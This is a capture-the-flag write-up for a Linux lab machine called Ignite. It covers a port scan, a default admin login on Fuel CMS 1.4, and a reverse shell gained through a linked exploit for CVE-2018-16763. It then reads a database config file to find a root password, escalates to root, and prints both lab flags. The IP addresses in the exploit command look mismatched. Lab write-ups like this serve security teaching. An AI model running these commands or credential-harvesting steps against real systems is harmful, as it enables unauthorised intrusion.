# Ignite Writeup

> Machine : Linux

> A new start-up has a few issues with their web server.

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 192.168.176.170 -p-
```

From our results, we can see port 80 (HTTP) are open. And there is a `robots.txt` file, and on it is a `/fuel` hidden directory on it.

After visiting the site on browser, we see that it's a default page for `Fuel CMS Version 1.4`.

Browsing `http://192.168.176.170/fuel/` we found a login page, and after login using the credentials on the default page `username: admin` `password: admin`, we don't find anything interesting.

Googling `Fuel CMS Version 1.4` we found this version contains a critical pre-authentication remote code execution vulnerability (CVE-2018-16763).

Using the exploit payload https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated/tree/main help us having a reverse shell.

```shell
nc -lnvp 5656
```

```shell
python3 /home/olid/Downloads/Fuel-Updated.py http://10.129.140.195/ 192.168.176.170 5656
```

Now we have a shell.

```shell
whoami
```

```shell
www-data
```

```shell
cat /home/www-data/flag.txt
```

```text
6470e394cbf6dab6a91682cc8585059b
```

> User.txt
> 
> 6470e394cbf6dab6a91682cc8585059b

Now we have to be root so we can read `root.txt`.

We also have an interesting thing on the web default page.

```text
After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
```

So we can find usernames and passwords in the `/database.php` file. Let's find out.

```shell
cat fuel/application/config/database.php
```

```sql
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```

That's it the user `root` has a password `mememe`.

```shell
su root
mememe
```

```shell
cat /root/root.txt
```

```text
b9bbcb33e11b80be759c4e844862482d
```

> root.txt
> 
> b9bbcb33e11b80be759c4e844862482d

